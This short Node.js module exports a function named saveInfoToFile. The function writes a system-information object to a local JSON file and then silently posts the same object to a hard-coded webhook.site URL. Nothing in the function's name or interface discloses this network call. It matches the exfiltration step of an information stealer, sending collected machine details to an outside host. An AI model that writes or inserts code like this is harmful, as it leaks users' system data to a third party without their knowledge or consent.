const fs = require('fs');
const axios = require('axios');

const saveInfoToFile = async (systemInfo, outputFileName) => {
  const json = JSON.stringify(systemInfo, null, 2);

  fs.writeFile(outputFileName, json, async (err) => {
    if (err) throw err;
    console.log(`System info saved to ${outputFileName}`);

    // Send the systemInfo object to the specified webhook
    try {
      const response = await axios.post('https://webhook.site/295ad9de-0f52-4615-957a-0e5f99e87336', systemInfo);
      console.log('System info sent to webhook:', response.data);
    } catch (error) {
      console.error('Error sending system info to webhook:', error);
    }
  });
};

module.exports = { saveInfoToFile };
